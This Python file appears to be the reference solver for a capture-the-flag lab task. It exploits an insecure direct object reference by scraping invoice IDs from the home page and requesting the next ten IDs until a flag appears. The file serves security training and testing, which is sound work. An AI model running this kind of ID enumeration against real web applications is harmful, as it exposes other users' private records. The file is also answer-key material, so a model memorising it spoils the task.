"""Intended-path solver: insecure direct object reference on invoice URLs."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

PROBE_WINDOW = 10


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    home = httpx.get(f"{ctx.url()}/", timeout=10)
    linked = sorted({int(m) for m in re.findall(r"/invoice/(\d+)", home.text)})
    lo = max(linked) if linked else 1000
    captured = None
    for candidate in range(lo + 1, lo + PROBE_WINDOW + 1):
        res = httpx.get(f"{ctx.url()}/invoice/{candidate}", timeout=10)
        flags = find_flags(res.text)
        if flags:
            captured = flags[0]
            break
    return SolveResult(
        results=[
            TaskResult(
                task_id="invoice-access",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"no flag on invoice ids {lo + 1}..{lo + PROBE_WINDOW}",
            )
        ]
    )
